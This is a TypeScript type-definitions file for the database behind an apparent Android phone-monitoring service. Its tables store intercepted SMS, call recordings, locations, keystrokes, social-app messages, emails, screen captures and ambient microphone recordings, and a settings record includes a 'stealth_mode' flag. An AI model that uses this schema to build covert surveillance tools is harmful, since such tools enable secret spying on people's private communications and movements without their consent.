export interface Profile {
  id: string;
  email: string;
  full_name: string | null;
  avatar_url: string | null;
  role: 'admin' | 'user';
  created_at: string;
  updated_at: string;
}

export interface Device {
  id: string;
  user_id: string;
  device_name: string;
  device_model: string | null;
  android_version: string | null;
  imei: string | null;
  phone_number: string | null;
  sim_operator: string | null;
  sim_serial: string | null;
  mac_address: string | null;
  battery_level: number;
  is_charging: boolean;
  storage_total: number | null;
  storage_used: number | null;
  ram_total: number | null;
  ram_used: number | null;
  is_online: boolean;
  last_seen: string | null;
  app_version: string | null;
  device_token: string | null;
  is_rooted: boolean;
  screen_status: string;
  created_at: string;
  updated_at: string;
}

export interface SmsMessage {
  id: string;
  device_id: string;
  message_type: 'incoming' | 'outgoing' | 'draft';
  sender_name: string | null;
  sender_number: string;
  receiver_name: string | null;
  receiver_number: string | null;
  body: string | null;
  is_mms: boolean;
  mms_attachment_url: string | null;
  latitude: number | null;
  longitude: number | null;
  timestamp: string;
  is_read: boolean;
  is_deleted: boolean;
  created_at: string;
}

export interface CallLog {
  id: string;
  device_id: string;
  call_type: 'incoming' | 'outgoing' | 'missed' | 'rejected' | 'blocked';
  contact_name: string | null;
  phone_number: string;
  duration: number;
  recording_url: string | null;
  recording_duration: number | null;
  latitude: number | null;
  longitude: number | null;
  timestamp: string;
  is_deleted: boolean;
  created_at: string;
}

export interface Location {
  id: string;
  device_id: string;
  latitude: number;
  longitude: number;
  altitude: number | null;
  accuracy: number | null;
  speed: number | null;
  bearing: number | null;
  address: string | null;
  provider: string | null;
  battery_level: number | null;
  is_mock: boolean;
  timestamp: string;
  created_at: string;
}

export interface Contact {
  id: string;
  device_id: string;
  contact_name: string | null;
  phone_numbers: {number: string; type: string}[] | null;
  emails: {email: string; type: string}[] | null;
  photo_url: string | null;
  organization: string | null;
  notes: string | null;
  is_deleted: boolean;
  last_modified: string | null;
  created_at: string;
}

export interface InstalledApp {
  id: string;
  device_id: string;
  app_name: string;
  package_name: string;
  version_name: string | null;
  version_code: number | null;
  app_icon_url: string | null;
  is_system_app: boolean;
  installed_at: string | null;
  last_used: string | null;
  usage_time_today: number;
  data_usage_mobile: number;
  data_usage_wifi: number;
  is_blocked: boolean;
  created_at: string;
}

export interface AppUsage {
  id: string;
  device_id: string;
  package_name: string;
  app_name: string | null;
  start_time: string;
  end_time: string | null;
  duration: number;
  created_at: string;
}

export interface MediaFile {
  id: string;
  device_id: string;
  file_type: 'photo' | 'video' | 'audio' | 'document';
  file_name: string | null;
  file_url: string;
  thumbnail_url: string | null;
  file_size: number | null;
  mime_type: string | null;
  width: number | null;
  height: number | null;
  duration: number | null;
  latitude: number | null;
  longitude: number | null;
  source: string | null;
  is_deleted: boolean;
  file_timestamp: string | null;
  created_at: string;
}

export interface SocialMessage {
  id: string;
  device_id: string;
  platform: string;
  message_type: 'text' | 'image' | 'video' | 'audio' | 'document' | 'sticker' | 'gif' | 'location' | 'contact' | 'call_log';
  direction: 'incoming' | 'outgoing' | null;
  sender_name: string | null;
  sender_id: string | null;
  receiver_name: string | null;
  receiver_id: string | null;
  group_name: string | null;
  group_id: string | null;
  body: string | null;
  media_url: string | null;
  media_thumbnail_url: string | null;
  is_deleted: boolean;
  timestamp: string;
  created_at: string;
}

export interface BrowserHistory {
  id: string;
  device_id: string;
  url: string;
  title: string | null;
  visit_count: number;
  browser_name: string | null;
  favicon_url: string | null;
  is_bookmarked: boolean;
  timestamp: string;
  created_at: string;
}

export interface BrowserBookmark {
  id: string;
  device_id: string;
  url: string;
  title: string | null;
  browser_name: string | null;
  folder: string | null;
  created_at: string;
}

export interface KeylogEntry {
  id: string;
  device_id: string;
  app_name: string | null;
  package_name: string | null;
  text_content: string;
  timestamp: string;
  created_at: string;
}

export interface CalendarEvent {
  id: string;
  device_id: string;
  title: string | null;
  description: string | null;
  location: string | null;
  start_time: string | null;
  end_time: string | null;
  all_day: boolean;
  calendar_name: string | null;
  organizer: string | null;
  attendees: any | null;
  created_at: string;
}

export interface Email {
  id: string;
  device_id: string;
  email_type: 'incoming' | 'outgoing' | 'draft' | null;
  from_address: string | null;
  from_name: string | null;
  to_addresses: any | null;
  cc_addresses: any | null;
  bcc_addresses: any | null;
  subject: string | null;
  body_preview: string | null;
  body_html: string | null;
  has_attachments: boolean;
  attachments: any | null;
  folder: string | null;
  is_read: boolean;
  timestamp: string;
  created_at: string;
}

export interface WifiNetwork {
  id: string;
  device_id: string;
  ssid: string;
  bssid: string | null;
  security_type: string | null;
  signal_strength: number | null;
  frequency: number | null;
  is_connected: boolean;
  ip_address: string | null;
  latitude: number | null;
  longitude: number | null;
  timestamp: string;
  created_at: string;
}

export interface NotificationLog {
  id: string;
  device_id: string;
  app_name: string | null;
  package_name: string | null;
  title: string | null;
  content: string | null;
  big_text: string | null;
  category: string | null;
  timestamp: string;
  created_at: string;
}

export interface SimChange {
  id: string;
  device_id: string;
  sim_operator: string | null;
  sim_serial: string | null;
  phone_number: string | null;
  country_code: string | null;
  event_type: 'inserted' | 'removed' | 'changed';
  timestamp: string;
  created_at: string;
}

export interface RemoteCommand {
  id: string;
  device_id: string;
  command_type: string;
  parameters: any | null;
  status: 'pending' | 'sent' | 'delivered' | 'executed' | 'failed' | 'expired';
  result: any | null;
  result_media_url: string | null;
  created_at: string;
  executed_at: string | null;
  expires_at: string | null;
}

export interface DeviceSettings {
  id: string;
  device_id: string;
  track_sms: boolean;
  track_calls: boolean;
  track_locations: boolean;
  location_interval_minutes: number;
  track_photos: boolean;
  track_videos: boolean;
  track_contacts: boolean;
  track_apps: boolean;
  track_browser: boolean;
  track_bookmarks: boolean;
  track_keylogger: boolean;
  track_calendar: boolean;
  track_emails: boolean;
  track_wifi: boolean;
  track_notifications: boolean;
  track_whatsapp: boolean;
  track_facebook: boolean;
  track_instagram: boolean;
  track_telegram: boolean;
  track_viber: boolean;
  track_signal: boolean;
  track_snapchat: boolean;
  track_skype: boolean;
  track_line: boolean;
  track_kik: boolean;
  track_wechat: boolean;
  track_tinder: boolean;
  track_discord: boolean;
  track_tiktok: boolean;
  track_youtube: boolean;
  track_zoom: boolean;
  track_google_meet: boolean;
  track_reddit: boolean;
  track_sim_changes: boolean;
  record_calls: boolean;
  stealth_mode: boolean;
  blocked_apps: string[];
  blocked_websites: string[];
  schedule_restriction: any | null;
  geofence_zones: any[];
  alert_keywords: string[];
  sync_on_wifi_only: boolean;
  created_at: string;
  updated_at: string;
}

export interface Alert {
  id: string;
  device_id: string;
  alert_type: string;
  title: string;
  description: string | null;
  severity: 'low' | 'medium' | 'high' | 'critical';
  related_data: any | null;
  is_read: boolean;
  timestamp: string;
  created_at: string;
}

export interface FileExplorerItem {
  id: string;
  device_id: string;
  file_path: string;
  file_name: string;
  file_type: string | null;
  file_size: number | null;
  mime_type: string | null;
  is_directory: boolean;
  parent_path: string | null;
  download_url: string | null;
  last_modified: string | null;
  created_at: string;
}

export interface ScreenCapture {
  id: string;
  device_id: string;
  capture_type: 'screenshot' | 'screen_recording';
  file_url: string;
  thumbnail_url: string | null;
  duration: number | null;
  file_size: number | null;
  timestamp: string;
  created_at: string;
}

export interface AmbientRecording {
  id: string;
  device_id: string;
  recording_url: string;
  duration: number;
  file_size: number | null;
  timestamp: string;
  created_at: string;
}

export type Tables = 
  | 'profiles' 
  | 'devices' 
  | 'sms_messages' 
  | 'call_logs' 
  | 'locations' 
  | 'contacts' 
  | 'installed_apps' 
  | 'app_usage' 
  | 'media_files' 
  | 'social_messages' 
  | 'browser_history' 
  | 'browser_bookmarks' 
  | 'keylog_entries' 
  | 'calendar_events' 
  | 'emails' 
  | 'wifi_networks' 
  | 'notification_logs' 
  | 'sim_changes' 
  | 'remote_commands' 
  | 'device_settings' 
  | 'alerts' 
  | 'file_explorer_items' 
  | 'screen_captures' 
  | 'ambient_recordings';

export interface Database {
  public: {
    Tables: {
      profiles: { Row: Profile; Insert: Partial<Profile>; Update: Partial<Profile> };
      devices: { Row: Device; Insert: Partial<Device>; Update: Partial<Device> };
      sms_messages: { Row: SmsMessage; Insert: Partial<SmsMessage>; Update: Partial<SmsMessage> };
      call_logs: { Row: CallLog; Insert: Partial<CallLog>; Update: Partial<CallLog> };
      locations: { Row: Location; Insert: Partial<Location>; Update: Partial<Location> };
      contacts: { Row: Contact; Insert: Partial<Contact>; Update: Partial<Contact> };
      installed_apps: { Row: InstalledApp; Insert: Partial<InstalledApp>; Update: Partial<InstalledApp> };
      app_usage: { Row: AppUsage; Insert: Partial<AppUsage>; Update: Partial<AppUsage> };
      media_files: { Row: MediaFile; Insert: Partial<MediaFile>; Update: Partial<MediaFile> };
      social_messages: { Row: SocialMessage; Insert: Partial<SocialMessage>; Update: Partial<SocialMessage> };
      browser_history: { Row: BrowserHistory; Insert: Partial<BrowserHistory>; Update: Partial<BrowserHistory> };
      browser_bookmarks: { Row: BrowserBookmark; Insert: Partial<BrowserBookmark>; Update: Partial<BrowserBookmark> };
      keylog_entries: { Row: KeylogEntry; Insert: Partial<KeylogEntry>; Update: Partial<KeylogEntry> };
      calendar_events: { Row: CalendarEvent; Insert: Partial<CalendarEvent>; Update: Partial<CalendarEvent> };
      emails: { Row: Email; Insert: Partial<Email>; Update: Partial<Email> };
      wifi_networks: { Row: WifiNetwork; Insert: Partial<WifiNetwork>; Update: Partial<WifiNetwork> };
      notification_logs: { Row: NotificationLog; Insert: Partial<NotificationLog>; Update: Partial<NotificationLog> };
      sim_changes: { Row: SimChange; Insert: Partial<SimChange>; Update: Partial<SimChange> };
      remote_commands: { Row: RemoteCommand; Insert: Partial<RemoteCommand>; Update: Partial<RemoteCommand> };
      device_settings: { Row: DeviceSettings; Insert: Partial<DeviceSettings>; Update: Partial<DeviceSettings> };
      alerts: { Row: Alert; Insert: Partial<Alert>; Update: Partial<Alert> };
      file_explorer_items: { Row: FileExplorerItem; Insert: Partial<FileExplorerItem>; Update: Partial<FileExplorerItem> };
      screen_captures: { Row: ScreenCapture; Insert: Partial<ScreenCapture>; Update: Partial<ScreenCapture> };
      ambient_recordings: { Row: AmbientRecording; Insert: Partial<AmbientRecording>; Update: Partial<AmbientRecording> };
    };
  };
}
